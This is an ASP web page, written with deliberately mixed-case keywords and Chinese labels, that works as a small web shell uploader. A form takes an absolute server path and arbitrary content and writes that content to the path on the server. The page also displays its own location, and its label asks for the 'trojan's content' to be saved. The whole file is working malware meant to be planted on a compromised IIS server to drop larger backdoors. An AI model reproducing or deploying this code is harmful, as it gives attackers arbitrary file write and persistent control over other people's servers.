<% Dim ObjFSO %>
<% Dim FDAtA %>
<% Dim ObjCOuntFilE %>
<% On ErrOr rEsumE nExt %>
<% SEt ObjFSO = SErvEr.CrEAtEObjEct("Scripting.FilESystEmObjEct") %>
<% iF Trim(rEquEst("syFDpAth"))<>"" thEn %>
<% FDAtA = rEquEst("cyFDDAtA") %>
<% SEt ObjCOuntFilE=ObjFSO.CrEAtETExtFilE(rEquEst("syFDpAth"),TruE) %>
<% ObjCOuntFilE.WritE FDAtA %>
<% iF Err =0 thEn %>
<% rEspOnsE.writE "<FOnt cOlOr=rED>sAvE SuccEss!</FOnt>" %>
<% ElsE %>
<% rEspOnsE.writE "<FOnt cOlOr=rED>SAvE UnSuccEss!</FOnt>" %>
<% EnD iF %>
<% Err.clEAr %>
<% EnD iF %>
<% ObjCOuntFilE.ClOsE %>
<% SEt ObjCOuntFilE=NOthing %>
<% SEt ObjFSO = NOthing %>
<% REspOnsE.writE "<FOrm ActiOn='' mEthOD=pOst>" %>
<% REspOnsE.writE "保存文件的<FOnt cOlOr=rED>绝对路径(包括文件名:如D:\wEb\x.Asp):</FOnt>" %>
<% REspOnsE.WritE "<input typE=tExt nAmE=syFDpAth wiDth=32 sizE=50>" %>
<% REspOnsE.WritE "<br>" %>
<% REspOnsE.writE "本文件绝对路径" %>
<% =sErvEr.mAppAth(REquEst.SErvErVAriAblEs("SCRIPT_NAME")) %>
<% REspOnsE.writE "<br>" %>
<% REspOnsE.writE "输入马的内容:" %>
<% REspOnsE.writE "<tExtArEA nAmE=cyFDDAtA cOls=80 rOws=10 wiDth=32></tExtArEA>" %>
<% REspOnsE.writE "<input typE=submit vAluE=保存>" %>
<% REspOnsE.writE "</FOrm>" %>

